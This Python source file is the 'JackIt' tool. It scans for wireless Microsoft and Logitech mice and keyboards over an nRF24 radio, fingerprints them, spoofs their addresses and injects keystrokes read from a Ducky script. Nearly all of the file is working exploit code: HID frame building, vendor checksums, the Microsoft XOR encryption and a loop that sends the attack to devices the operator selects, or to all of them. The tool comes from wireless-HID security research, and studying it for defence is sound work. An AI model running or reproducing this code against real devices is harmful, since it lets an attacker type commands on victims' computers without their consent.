#!/usr/bin/env python
# -*- coding: utf-8 -*-

import datetime
import os
import time
import click
import tabulate
from lib import nrf24


__version__ = 0.01
__authors__ = "phikshun, infamy"

# some console colours
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray


class DuckyParser(object):
    ''' Help map ducky like script to HID codes to be sent '''
    
    hid_map = {
        'a':            [4, False],
        'A':            [4, True],
        'b':            [5, False],
        'B':            [5, True],
        'c':            [6, False],
        'C':            [6, True],
        'd':            [7, False],
        'D':            [7, True],
        'e':            [8, False],
        'E':            [8, True],
        'f':            [9, False],
        'F':            [9, True],
        'g':            [10, False],
        'G':            [10, True],
        'h':            [11, False],
        'H':            [11, True],
        'i':            [12, False],
        'I':            [12, True],
        'j':            [13, False],
        'J':            [13, True],
        'k':            [14, False],
        'K':            [14, True],
        'l':            [15, False],
        'L':            [15, True],
        'm':            [16, False],
        'M':            [16, True],
        'n':            [17, False],
        'N':            [17, True],
        'o':            [18, False],
        'O':            [18, True],
        'p':            [19, False],
        'P':            [19, True],
        'q':            [20, False],
        'Q':            [20, True],
        'r':            [21, False],
        'R':            [21, True],
        's':            [22, False],
        'S':            [22, True],
        't':            [23, False],
        'T':            [23, True],
        'u':            [24, False],
        'U':            [24, True],
        'v':            [25, False],
        'V':            [25, True],
        'w':            [26, False],
        'W':            [26, True],
        'x':            [27, False],
        'X':            [27, True],
        'y':            [28, False],
        'Y':            [28, True],
        'z':            [29, False],
        'Z':            [29, True],
        '1':            [30, False],
        '!':            [30, True],
        '2':            [31, False],
        '@':            [31, True],
        '3':            [32, False],
        '#':            [32, True],
        '4':            [33, False],
        '$':            [33, True],
        '5':            [34, False],
        '%':            [34, True],
        '6':            [35, False],
        '^':            [35, True],
        '7':            [36, False],
        '&':            [36, True],
        '8':            [37, False],
        '*':            [37, True],
        '9':            [38, False],
        '(':            [38, True],
        '0':            [39, False],
        ')':            [39, True],
        'ENTER':        [40, False],
        'ESCAPE':       [41, False],
        'DELETE':       [42, False],
        'TAB':          [43, False],
        'SPACE':        [44, False],
        ' ':            [44, False],
        '-':            [45, False],
        '_':            [45, True],
        '=':            [46, False],
        '+':            [46, True],
        '[':            [47, False],
        '{':            [47, True],
        ']':            [48, False],
        '}':            [48, True],
        '\\':           [49, False],
        '|':            [49, True],
        ';':            [51, False],
        ':':            [51, True],
        '\'':           [52, False],
        '"':            [52, True],
        '`':            [53, False],
        '~':            [53, True],
        ',':            [54, False],
        '<':            [54, True],
        '.':            [55, False],
        '>':            [55, True],
        '/':            [56, False],
        '?':            [56, True],
        'CAPSLOCK':     [57, False],
        'F1':           [58, False],
        'F2':           [59, False],
        'F3':           [60, False],
        'F4':           [61, False],
        'F5':           [62, False],
        'F6':           [63, False],
        'F7':           [64, False],
        'F8':           [65, False],
        'F9':           [66, False],
        'F10':          [67, False],
        'F11':          [68, False],
        'F12':          [69, False],
        'PRINTSCREEN':  [70, False],
        'SCROLLLOCK':   [71, False],
        'PAUSE':        [72, False],
        'INSERT':       [73, False],
        'HOME':         [74, False],
        'PAGEUP':       [75, False],
        'DEL':          [76, False],
        'END':          [77, False],
        'PAGEDOWN':     [78, False],
        'RIGHT':        [79, False],
        'LEFT':         [80, False],
        'DOWN':         [81, False],
        'UP':           [82, False],
    }

    blank_entry = {
        "meta": False,
        "shift": False,
        "alt": False,
        "ctrl": False,
        "hid": 0,
        "char": '',
        "sleep": 0
    }

    def __init__(self, attack_script):
        self.script = attack_script.split("\n")

    def char_to_hid(self, char):
        return self.hid_map[char]

    def parse(self):
        entries = []
        
        # process lines for repeat
        for pos, line in enumerate(self.script):
            if line.startswith("REPEAT"):
                self.script.remove(line)
                for i in range(1, int(line.split()[1])):
                    self.script.insert(pos,self.script[pos - 1])

        for line in self.script:
            if line.startswith('ALT'):
                entry = self.blank_entry.copy()
                entry['alt'] = True
                entry['char'] = line.split()[1]
                entry['hid'], entry['shift'] = self.char_to_hid(entry['char'])
                entries.append(entry)

            elif line.startswith("GUI") or line.startswith('WINDOWS') or line.startswith('COMMAND'):
                entry = self.blank_entry.copy()
                entry['meta'] = True
                entry['char'] = line.split()[1]
                entry['hid'], entry['shift'] = self.char_to_hid(entry['char'])
                entries.append(entry)

            elif line.startswith('CTRL') or line.startswith('CONTROL'):
                entry = self.blank_entry.copy()
                entry['ctrl'] = True
                entry['char'] = line.split()[1]
                entry['hid'], entry['shift'] = self.char_to_hid(entry['char'])
                entries.append(entry)

            elif line.startswith('SHIFT'):
                entry = self.blank_entry.copy()
                entry['shift'] = True
                entry['char'] = line.split()[1]
                entry['hid'], entry['shift'] = self.char_to_hid(entry['char'])
                entries.append(entry)

            elif line.startswith("ESC") or line.startswith('APP') or line.startswith('ESCAPE'):
                entry = self.blank_entry.copy()
                entry['char'] = "ESC"
                entry['hid'], entry['shift'] = self.char_to_hid('ESC')
                entries.append(entry)

            elif line.startswith("DELAY"):
                entry = self.blank_entry.copy()
                entry['sleep'] = line.split()[1]
                entries.append(entry)

            elif line.startswith("STRING"):
                for char in " ".join(line.split()[1:]):
                    entry = self.blank_entry.copy()
                    entry['char'] = char
                    entry['hid'], entry['shift'] = self.char_to_hid(char)
                    entries.append(entry)

            elif line.startswith("ENTER"):
                entry = self.blank_entry.copy()
                entry['char'] = "\n"
                entry['hid'], entry['shift'] = self.char_to_hid('ENTER')
                entries.append(entry)   

            elif len(line) == 0:
                pass
            
            else:
                print "CAN'T PROCESS... %s" % line

        return entries


class JackIt(object):
    ''' Class for scanning, pinging and fingerprint devices '''

    def __init__(self, disable_lna=False, debug=False):
        self.channels = range(2, 84)
        self.channel_index = 0
        self.debug = debug
        self.devices = {}
        self.init_radio(disable_lna)

    def _debug(self, text):
        if self.debug:
            print P + "[D] " + W + text

    def hexify(self, data):
        return ':'.join('{:02X}'.format(x) for x in data)

    def unhexify_addr(self, val):
        return self.unhexify(val)[::-1][:5]

    def unhexify(self, val):
        return val.replace(':', '').decode('hex')

    def serialize_payload(self, p):
        return str(bytearray(p))

    def serialize_address(self, a):
        return ''.join(chr(b) for b in a[::-1])

    def init_radio(self, disable_lna):
        self.radio = nrf24.nrf24(0)
        if not disable_lna:
            self.radio.enable_lna()

    def scan(self, timeout=5.0):
        # Put the radio in promiscuous mode
        self.radio.enter_promiscuous_mode('')
        dwell_time = 0.1

        # Set the initial channel
        self.radio.set_channel(self.channels[self.channel_index])

        # Sweep through the self.channels and decode ESB packets in pseudo-promiscuous mode
        last_tune = time.time()
        total_time = time.time()

        try:
            while time.time() - total_time < timeout:

                if len(self.channels) > 1 and time.time() - last_tune > dwell_time:
                    self.channel_index = (self.channel_index + 1) % (len(self.channels))
                    self.radio.set_channel(self.channels[self.channel_index])
                    last_tune = time.time()

                value = self.radio.receive_payload()
                if len(value) >= 5:
                    address, payload = value[0:5], value[5:]
                    a = self.hexify(address)
                    self._debug("ch: %02d addr: %s packet: %s" % (self.channels[self.channel_index], a, self.hexify(payload)))

                    if a in self.devices:
                        self.devices[a]['count'] += 1
                        self.devices[a]['timestamp'] = time.time()
                        if not self.channels[self.channel_index] in self.devices[a]['channels']:
                            self.devices[a]['channels'].append(self.channels[self.channel_index])
                        if payload and self.fingerprint_device(payload):
                            self.devices[a]['device'] = self.fingerprint_device(payload)
                            self.devices[a]['payload'] = payload
                    else:
                        self.devices[a] = {'address': address, 'channels': [self.channels[self.channel_index]], 'count': 1, 'payload': payload, 'device': ''}
                        self.devices[a]['timestamp'] = time.time()
                        if payload and self.fingerprint_device(payload):
                            self.devices[a]['device'] = self.fingerprint_device(payload)

        except RuntimeError:
            print R + '[!] ' + W + 'Runtime error during scan'
            exit(-1)
        return self.devices

    def sniff(self, address):
        self.radio.enter_sniffer_mode(''.join(chr(b) for b in address[::-1]))

    def find_channel(self, address):
        ping = '0F:0F:0F:0F'.replace(':', '').decode('hex')
        self.radio.enter_sniffer_mode(self.serialize_address(address))
        for channel in range(2, 84):
            self.radio.set_channel(channel)
            if self.radio.transmit_payload(self.serialize_payload(ping), 5, 1):
                return channel
        return None

    def set_channel(self, channel):
        self.current_channel = channel
        self.radio.set_channel(channel)

    def transmit_hook(self, payload):
        self._debug("Sending: " + self.hexify(payload))

    def transmit_payload(self, payload):
        self.transmit_hook(payload)
        return self.radio.transmit_payload(self.serialize_payload(payload), 4, 15)

    def fingerprint_device(self, p):
        if len(p) == 19 and (p[0] == 0x08 or p[0] == 0x0c) and p[6] == 0x40:
            # Most likely a non-XOR encrypted Microsoft mouse
            return 'Microsoft HID'
        elif len(p) == 19 and p[0] == 0x0a:
            # Most likely an XOR encrypted Microsoft mouse
            return 'MS Encrypted HID'
        elif len(p) == 10 and p[0] == 0 and p[1] == 0xC2:
            # Definitely a logitech mouse movement packet
            return 'Logitech HID'
        elif len(p) == 22 and p[0] == 0 and p[1] == 0xD3:
            # Definitely a logitech keystroke packet
            return 'Logitech HID'
        elif len(p) == 5 and p[0] == 0 and p[1] == 0x40:
            # Most likely logitech keepalive packet
            return 'Logitech HID'
        elif len(p) == 10 and p[0] == 0 and p[1] == 0x4F:
            # Most likely logitech sleep timer packet
            return 'Logitech HID'
        else:
            return ''

    def attack(self, hid, attack):
        for key in attack:
            if key['hid']:
                frames = hid.build_frames(key)
                for frame in frames:
                    self.transmit_payload(frame[0])
                    time.sleep(frame[1] / 1000.0)
            elif key['sleep']:
                time.sleep(int(key['sleep']) / 1000.0)


class MicrosoftHID(object):
    ''' Injection code for MS mouse '''

    def __init__(self, address, payload):
        self.address = address
        self.device_vendor = 'Microsoft'
        self.sequence_num = 0
        self.payload_template = payload[:].tolist()
        self.payload_template[4:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
        self.payload_template[6] = 67

    def checksum(self, payload):
        # MS checksum algorithm - as per KeyKeriki paper
        payload[-1] = 0
        for i in range(0, len(payload) - 1):
            payload[-1] ^= payload[i]
        payload[-1] = ~payload[-1] & 0xff
        return payload

    def sequence(self, payload):
        # MS frames use a 2 bytes sequence number
        payload[5] = (self.sequence_num >> 8) & 0xff
        payload[4] = self.sequence_num & 0xff
        self.sequence_num += 1
        return payload

    def key(self, payload, key):
        payload[7] = 0
        payload[9] = key['hid']
        if key['meta']:
            payload[7] |= 0x08
        if key['alt']:
            payload[7] |= 0x04
        if key['shift']:
            payload[7] |= 0x02
        if key['ctrl']:
            payload[7] |= 0x01
        return payload

    def build_frames(self, key):
        transmission = []
        while self.sequence_num < 5:
            null = self.checksum(self.sequence(self.payload_template[:]))
            transmission.append([null, 0])

        payload = self.checksum(self.key(self.sequence(self.payload_template[:]), key))
        null = self.checksum(self.sequence(self.payload_template[:]))
        transmission += [[payload, 0], [null, 0]]
        return transmission


class MicrosoftEncHID(MicrosoftHID):
    ''' Injection code for MS mouse (encrypted) '''

    def __init__(self, address, payload):
        self.address = address
        self.device_vendor = 'Microsoft'
        self.sequence_num = 0
        self.payload_template = self.xor_crypt(payload[:].tolist())
        self.payload_template[4:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
        self.payload_template[6] = 67

    def xor_crypt(self, payload):
        # MS encryption algorithm - as per KeyKeriki paper
        raw_address = self.address[::-1][:5]
        for i in range(4, len(payload)):
            payload[i] ^= raw_address[(i - 4) % 5]
        return payload

    def build_frames(self, key):
        transmission = []
        while self.sequence_num < 5:
            null = self.xor_crypt(self.checksum(self.sequence(self.payload_template[:])))
            transmission.append([null, 5])

        payload = self.xor_crypt(self.checksum(self.key(self.sequence(self.payload_template[:]), key)))
        null = self.xor_crypt(self.checksum(self.sequence(self.payload_template[:])))
        transmission += [[payload, 5], [null, 5]]
        return transmission


class LogitechHID(object):
    ''' Injection for Logitech devices '''

    def __init__(self, address, payload):
        self.address = address
        self.device_vendor = 'Logitech'
        # Mouse frames use type 0xC2
        # Multmedia key frames use type 0xC3
        # To see why this works, read diagram 2.3.2 of:
        # https://lekensteyn.nl/files/logitech/Unifying_receiver_DJ_collection_specification_draft.pdf
        # (discovered by wiresharking usbmon)
        self.payload_template = [0, 0xC1, 0, 0, 0, 0, 0, 0, 0, 0]

    def checksum(self, payload):
        # This is also from the KeyKeriki paper
        # Thanks Thorsten and Max!
        cksum = 0xff
        for n in range(0, len(payload) - 1):
            cksum = (cksum - payload[n]) & 0xff
        cksum = (cksum + 1) & 0xff
        payload[-1] = cksum
        return payload

    def key(self, payload, key):
        payload[2] = 0
        payload[3] = key['hid']
        if key['meta']:
            payload[2] |= 0x08
        if key['alt']:
            payload[2] |= 0x04
        if key['shift']:
            payload[2] |= 0x02
        if key['ctrl']:
            payload[2] |= 0x01
        return payload

    def build_frames(self, key):
        transmission = []
        payload = self.checksum(self.key(self.payload_template[:], key))
        null = self.checksum(self.payload_template[:])
        transmission += [[payload, 10], [null, 10]]
        return transmission


def banner():
    print r"""
     ____.              __   .___  __
    |    |____    ____ |  | _|   |/  |_
    |    \__  \ _/ ___\|  |/ /   \   __\
/\__|    |/ __ \\  \___|    <|   ||  |
\________(____  /\___  >__|_ \___||__|
              \/     \/     \/          """

    print "JackIt Version %0.2f" % __version__
    print "Created by %s" % __authors__
    print ""


def confirmroot():
    # make sure we are root
    if os.getuid() != 0:
        print R + "[!] " + W + "ERROR: You need to run as root!"
        print R + "[!] " + W + "login as root (su root) or try sudo ./jackit.py"
        exit(-1)


@click.command()
@click.option('--debug', is_flag=True, help='Enable debug.')
@click.option('--script', default="", help="Ducky file to use for injection", type=click.Path())
@click.option('--lowpower', is_flag=True, help="Disable LNA on CrazyPA")
@click.option('--interval', default=5, help="Interval of scan in seconds, default to 5s")
def cli(debug, script, lowpower, interval):

    banner()
    confirmroot()

    if debug:
        print O + "[W] " + W + "Debug is enabled"

    if script == "":
        print R + '[!] ' + W + "You must supply a ducky script using --script <filename>"
        print R + '[!] ' + W + "Attacks are disabled."
        attack = ""
    else:
        f = open(script, 'r')
        parser = DuckyParser(f.read())
        attack = parser.parse()

    # Initialize the radio
    try:
        jack = JackIt(lowpower, debug)
    except Exception as e:
        if e.__str__() == "Cannot find USB dongle.":
            print R + "[!] " + W + "Cannot find Crazy PA USB dongle."
            print R + "[!] " + W + "Please make sure you have it preloaded with the mousejack firmware."
            exit(-1)

    print G + "[+] " + W + 'Scanning...'

    # Enter main loop
    try:
        try:
            while True:
                devices = jack.scan(interval)

                click.clear()
                print GR + "[+] " + W + ("Scanning every %ds " % interval) + G + "CTRL-C " + W + "when ready."
                print ""

                idx = 0
                pretty_devices = []
                for key, device in devices.iteritems():
                    idx = idx + 1
                    pretty_devices.append([
                        idx,
                        key,
                        ",".join(str(x) for x in device['channels']),
                        device['count'],
                        str(datetime.timedelta(seconds=int(time.time() - device['timestamp']))) + ' ago',
                        device['device'],
                        jack.hexify(device['payload'])
                    ])

                print tabulate.tabulate(pretty_devices, headers=["KEY", "ADDRESS", "CHANNELS", "COUNT", "SEEN", "TYPE", "PACKET"])
        except KeyboardInterrupt:
            print ""

        if 'devices' not in locals() or len(devices) == 0:
            print R + "[!] " + W + "No devices found please try again..."
            exit(-1)

        if attack == "":
            print R + "[!] " + W + "No attack script was provided..."
            exit(-1)

        print GR + "\n[+] " + W + "Select " + G + "target keys" + W + " (" + G + "1-%s)" % (str(len(devices)) + W) + \
            " separated by commas, or '%s': " % (G + 'all' + W),
        value = click.prompt('', default="all")
        value = value.strip().lower()

        if value == "all":
            victims = pretty_devices[:]
        else:
            victims = []
            for vic in value.split(","):
                if int(vic) <= len(pretty_devices):
                    victims.append(pretty_devices[(int(vic)-1)])
                else:
                    print R + "[!] " + W + ("Device %d key is out of range" % int(vic))

        targets = []
        for victim in victims:
            if victim[1] in devices:
                targets.append(devices[victim[1]])

        for target in targets:
            payload = target['payload']
            channels = target['channels']
            address = target['address']
            device_type = target['device']

            # Sniffer mode allows us to spoof the address
            jack.sniff(address)
            hid = None
            # Figure out what we've got
            device_type = jack.fingerprint_device(payload)
            if device_type == 'Microsoft HID':
                hid = MicrosoftHID(address, payload)
            elif device_type == 'MS Encrypted HID':
                hid = MicrosoftEncHID(address, payload)
            elif device_type == 'Logitech HID':
                hid = LogitechHID(address, payload)

            if hid:
                # Attempt to ping the devices to find the current channel
                lock_channel = jack.find_channel(address)

                if lock_channel:
                    print GR + '[+] ' + W + 'Ping success on channel %d' % (lock_channel,)
                    print GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), device_type, lock_channel)
                    jack.attack(hid, attack)
                else:
                    # If our pings fail, go full hail mary
                    print R + '[-] ' + W + 'Ping failed, trying all channels'
                    for channel in channels:
                        jack.set_channel(channel)
                        print GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), device_type, channel)
                        jack.attack(hid, attack)
            else:
                print R + '[-] ' + W + "Target %s is not injectable. Skipping..." % (jack.hexify(address))
                continue

        print GR + '\n[+] ' + W + "All attacks completed\n"

    except KeyboardInterrupt:
        print '\n ' + R + '(^C)' + O + ' interrupted\n'
        print "[-] Quitting"

if __name__ == '__main__':
    cli()
